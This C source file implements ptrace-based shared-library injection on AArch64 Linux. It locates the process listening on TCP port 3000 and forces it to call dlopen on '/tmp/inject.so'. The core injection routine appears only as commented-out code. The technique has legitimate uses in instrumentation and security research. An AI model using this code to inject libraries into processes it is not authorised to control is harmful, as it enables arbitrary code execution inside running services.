#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <sys/uio.h>    // struct iovec
#include <elf.h>        // NT_PRSTATUS
#include <signal.h>
#include <errno.h>
#include "injector.h"
// AArch64 register struct (Linux-specific)
#include <asm/ptrace.h> // struct user_pt_regs

#include "identify_listening_process_details.h"
// ---------- helpers: find library base in /proc/<pid>/maps ----------

// unsigned long long findLibrary(const char *library, pid_t pid) {
//     char mapFilename[1024];
//     char buffer[9076];
//     FILE *fd;
//     unsigned long long addr = 0;
//
//     if (pid == -1) {
//         snprintf(mapFilename, sizeof(mapFilename), "/proc/self/maps");
//     } else {
//         snprintf(mapFilename, sizeof(mapFilename), "/proc/%d/maps", pid);
//     }
//
//     fd = fopen(mapFilename, "r");
//     if (!fd) {
//         perror("fopen maps");
//         exit(1);
//     }
//
//     while (fgets(buffer, sizeof(buffer), fd)) {
//         if (strstr(buffer, library)) {
//             addr = strtoull(buffer, NULL, 16);
//             break;
//         }
//     }
//
//     fclose(fd);
//     return addr;
// }
//
// // ---------- find an executable region in target ----------
//
// void *freeSpaceAddr(pid_t pid) {
//     FILE *fp;
//     char filename[64];
//     char line[850];
//     unsigned long addr;
//     char perms[8];
//     char devinode[64];
//
//     snprintf(filename, sizeof(filename), "/proc/%d/maps", pid);
//     if ((fp = fopen(filename, "r")) == NULL) {
//         printf("[!] Error, could not open maps file for process %d\n", pid);
//         exit(1);
//     }
//
//     while (fgets(line, sizeof(line), fp) != NULL) {
//         // addr-perm devinode ...
//         // e.g. 555555554000-555555556000 r-xp 00000000 08:02 123456 /path
//         if (sscanf(line, "%lx-%*lx %7s %*s %63s %*d",
//                    &addr, perms, devinode) >= 2) {
//             if (strchr(perms, 'x') != NULL) {
//                 break;
//             }
//         }
//     }
//
//     fclose(fp);
//     return (void *)addr;
// }
//
// // ---------- ptrace memory helpers ----------
//
// void ptraceRead(pid_t pid, unsigned long long addr, void *data, int len) {
//     long word;
//     int i;
//     char *ptr = (char *)data;
//
//     for (i = 0; i < len; i += sizeof(word)) {
//         errno = 0;
//         word = ptrace(PTRACE_PEEKTEXT, pid, (void *)(addr + i), NULL);
//         if (word == -1 && errno != 0) {
//             perror("[!] Error reading process memory");
//             exit(1);
//         }
//         memcpy(ptr + i, &word, sizeof(word));
//     }
// }
//
// void ptraceWrite(pid_t pid, unsigned long long addr, const void *data, int len) {
//     long word;
//     int i;
//
//     for (i = 0; i < len; i += sizeof(word)) {
//         memset(&word, 0, sizeof(word));
//         memcpy(&word, (const char *)data + i,
//                (len - i >= (int)sizeof(word)) ? sizeof(word) : (len - i));
//         if (ptrace(PTRACE_POKETEXT, pid, (void *)(addr + i),
//                    (void *)word) == -1) {
//             perror("[!] Error writing to process memory");
//             exit(1);
//         }
//     }
// }
//
// // ---------- AArch64 reg access wrappers (GETREGSET / SETREGSET) ----------
//
// static int get_regs(pid_t pid, struct user_pt_regs *regs) {
//     struct iovec iov;
//     iov.iov_base = regs;
//     iov.iov_len  = sizeof(*regs);
//     if (ptrace(PTRACE_GETREGSET, pid, (void *)NT_PRSTATUS, &iov) == -1) {
//         perror("PTRACE_GETREGSET");
//         return -1;
//     }
//     return 0;
// }
//
// static int set_regs(pid_t pid, const struct user_pt_regs *regs) {
//     struct iovec iov;
//     iov.iov_base = (void *)regs;
//     iov.iov_len  = sizeof(*regs);
//     if (ptrace(PTRACE_SETREGSET, pid, (void *)NT_PRSTATUS, &iov) == -1) {
//         perror("PTRACE_SETREGSET");
//         return -1;
//     }
//     return 0;
// }
//
// // ---------- injection logic for AArch64 ----------
//
// void inject(pid_t pid, void *dlopenAddr) {
//     struct user_pt_regs oldregs, regs;
//     int status;
//     unsigned char *oldcode;
//     void *freeaddr;
//
//     // Attach to the target process
//     if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
//         perror("PTRACE_ATTACH");
//         exit(1);
//     }
//     if (waitpid(pid, &status, WUNTRACED) == -1) {
//         perror("waitpid attach");
//         exit(1);
//     }
//
//     // Store current register values
//     if (get_regs(pid, &oldregs) == -1) {
//         exit(1);
//     }
//     memcpy(&regs, &oldregs, sizeof(struct user_pt_regs));
//
//     oldcode = (unsigned char *)malloc(64);
//     if (!oldcode) {
//         perror("malloc");
//         exit(1);
//     }
//
//     // Find a place to write our stuff
//     freeaddr = freeSpaceAddr(pid);
//     printf("[*] Using free/executable region at %p\n", freeaddr);
//
//     // Backup original code at that address (a small chunk is enough)
//     ptraceRead(pid, (unsigned long long)freeaddr, oldcode, 64);
//
//     // Layout:
//     // freeaddr:      "/tmp/inject.so\0" (max 16 bytes)
//     // freeaddr+16:   BRK instruction (4 bytes)
//     // (rest not used)
//
//     const char libpath[] = "/tmp/inject.so";
//     ptraceWrite(pid, (unsigned long long)freeaddr, libpath, sizeof(libpath));
//
//     // AArch64 BRK #0 instruction encodes to 0xd4200000
//     unsigned int brk_insn = 0xd4200000;
//     ptraceWrite(pid, (unsigned long long)freeaddr + 16,
//                 &brk_insn, sizeof(brk_insn));
//
//     // Now set up registers to call:
//     //   dlopen("/tmp/inject.so", RTLD_LAZY);
//     //
//     // AArch64 ABI:
//     //   x0 = first arg  (char *filename)
//     //   x1 = second arg (int flags)
//     //   x0 = return value
//     //
//     // We'll let dlopen return to the BRK instruction at freeaddr+16
//     // by placing that address in x30 (link register).
//
//     regs.regs[0] = (unsigned long long)freeaddr;        // x0 = path
//     regs.regs[1] = 2;                                   // x1 = RTLD_LAZY
//     regs.regs[30] = (unsigned long long)freeaddr + 16;  // x30 (LR) = BRK
//
//     regs.pc = (unsigned long long)dlopenAddr;           // PC = dlopen()
//
//     if (set_regs(pid, &regs) == -1) {
//         exit(1);
//     }
//
//     // Continue execution; it will run dlopen, then BRK, giving SIGTRAP
//     if (ptrace(PTRACE_CONT, pid, NULL, NULL) == -1) {
//         perror("PTRACE_CONT");
//         exit(1);
//     }
//
//     if (waitpid(pid, &status, WUNTRACED) == -1) {
//         perror("waitpid after CONT");
//         exit(1);
//     }
//
//     if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {
//         // Get registers after dlopen returns
//         if (get_regs(pid, &regs) == -1) {
//             exit(1);
//         }
//
//         // dlopen() return value is in x0
//         if (regs.regs[0] != 0) {
//             printf("[*] Injected library loaded at address %p\n",
//                    (void *)regs.regs[0]);
//         } else {
//             printf("[!] Library could not be injected\n");
//             // fall through to restore anyway
//         }
//
//         // Restore original code
//         ptraceWrite(pid, (unsigned long long)freeaddr, oldcode, 64);
//
//         // Restore original registers
//         if (set_regs(pid, &oldregs) == -1) {
//             exit(1);
//         }
//
//         // Detach
//         if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
//             perror("PTRACE_DETACH");
//             exit(1);
//         }
//     } else {
//         printf("[!] Fatal Error: Process stopped for unknown reason\n");
//         exit(1);
//     }
//
//     free(oldcode);
// }

// ---------- main ----------


int main(int argc, char **argv) {
    unsigned long long remoteLib, localLib;
    void *dlopenAddr = NULL;
    void *libdlAddr  = NULL;
    int port = 3000;

    printf("Looking for process listening on TCP port %d...\n", port);

    fd_details * listening_socket_details = (fd_details*) calloc(1, sizeof(fd_details));
    identify_listening_process_details(3000, listening_socket_details);

    if (listening_socket_details->pid == 0) {
        printf("No listening socket found on port %d (IPv4, /proc/net/tcp).\n", port);
        return 0;
    }

    printf("Found listening socket inode: %lu\n", listening_socket_details->inode);

    // pid_t target = listening_socket_details->pid;

    inject(listening_socket_details->pid);
    // Load libdl in our own process
    // libdlAddr = dlopen("libdl.so.2", RTLD_LAZY);
    // if (libdlAddr == NULL) {
    //     printf("[!] Error opening libdl.so.2: %s\n", dlerror());
    //     exit(1);
    // }
    // printf("[*] libdl.so.2 loaded at address %p\n", libdlAddr);
    //
    // // Get address of dlopen()
    // dlopenAddr = dlsym(libdlAddr, "dlopen");
    // if (dlopenAddr == NULL) {
    //     printf("[!] Error locating dlopen() function\n");
    //     exit(1);
    // }
    // printf("[*] dlopen() found at address %p\n", dlopenAddr);
    //
    // // Find base of libdl in the target process
    // // (adjust string to match your system's libdl mapping name)
    // remoteLib = findLibrary("libdl.so.2", target);
    // printf("[*] libdl located in PID %d at address %p\n",
    //        target, (void *)remoteLib);
    //
    // // Find base of libdl in our own process
    // localLib = findLibrary("libdl.so.2", -1);
    //
    // // Adjust dlopenAddr for target ASLR:
    // // remote_dlopen = remoteLib + (dlopenAddr - localLib)
    // dlopenAddr = (void *)(remoteLib + ((unsigned long long)dlopenAddr - localLib));
    //
    // printf("[*] dlopen() offset in libdl: 0x%llx bytes\n",
    //        (unsigned long long)((unsigned long long)dlopenAddr - remoteLib));
    // printf("[*] dlopen() in target process at address %p\n", dlopenAddr);
    //
    // // Inject our shared library into the target process
    // inject(target, dlopenAddr);

    return 0;
}
